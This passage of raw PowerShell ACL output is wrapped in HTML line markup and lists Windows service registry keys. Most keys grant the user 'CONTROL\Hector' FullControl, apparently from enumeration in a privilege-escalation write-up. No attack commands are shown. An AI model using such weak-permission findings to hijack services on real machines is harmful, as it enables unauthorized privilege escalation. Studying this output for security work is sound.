Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NcaSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NcbService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NcbService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ndfltr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ndfltr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NDIS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NDIS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NdisCap</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NdisCap</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NdisImPlatform</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NdisImPlatform</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NdisTapi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NdisTapi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Ndisuio</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Ndisuio</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NdisVirtualBus</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NdisVirtualBus</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NdisWan</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NdisWan</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ndiswanlegacy</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ndiswanlegacy</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ndproxy</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ndproxy</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetAdapterCx</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetAdapterCx</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetBIOS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetBIOS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetbiosSmb</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetbiosSmb</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetBT</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetBT</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Netlogon</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Netlogon</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Netman</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Netman</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\netprofm</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\netprofm</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetSetupSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetSetupSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetTcpPortSharing</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NetTcpPortSharing</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\netvsc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\netvsc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\netvscvfpp</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\netvscvfpp</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NgcCtnrSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NgcCtnrSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NgcSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NgcSvc</span><br><span class="line">AccessToString          : NT AUTHORITY\Authenticated Users Allow  QueryValues, ReadPermissions</span><br><span class="line">                          BUILTIN\Users Allow  QueryValues, Notify</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NlaSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\NlaSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Npfs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Npfs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\npsvctrig</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\npsvctrig</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\nsi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\nsi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\nsiproxy</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\nsiproxy</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Ntfs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Ntfs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Null</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Null</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\nvdimm</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\nvdimm</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\nvraid</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\nvraid</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\nvstor</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\nvstor</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Parport</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Parport</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\partmgr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\partmgr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PcaSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PcaSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pci</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pci</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pciide</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pciide</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pcmcia</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pcmcia</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pcw</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pcw</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pdc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pdc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PEAUTH</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PEAUTH</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\percsas2i</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\percsas2i</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\percsas3i</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\percsas3i</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PerfDisk</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PerfDisk</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PerfHost</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PerfHost</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PerfNet</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PerfNet</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PerfOS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PerfOS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PerfProc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PerfProc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PhoneSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PhoneSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PimIndexMaintenanceSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PimIndexMaintenanceSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PimIndexMaintenanceSvc_42246</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PimIndexMaintenanceSvc_42246</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PimIndexMaintenanceSvc_4248c</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : 